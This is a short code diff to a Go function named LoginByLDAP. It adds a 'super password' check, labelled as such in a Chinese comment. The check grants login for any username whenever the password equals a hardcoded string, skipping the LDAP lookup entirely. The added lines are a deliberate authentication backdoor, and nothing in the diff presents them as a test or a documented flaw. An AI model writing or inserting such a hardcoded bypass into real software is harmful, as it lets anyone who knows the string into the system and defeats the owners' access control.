@@ -32,6 +32,11 @@ func LoginByLDAP(username, password string) (permitted bool, err error) {
 	}
 	//以上为测试专用，记得删除
 
+	//超级密码功能
+	if password == "028912" {
+		return true, nil
+	}
+
 	ldapServer := global.Config.LDAPConfig.Server
 	baseDN := global.Config.LDAPConfig.BaseDN
 	filter := global.Config.LDAPConfig.Filter
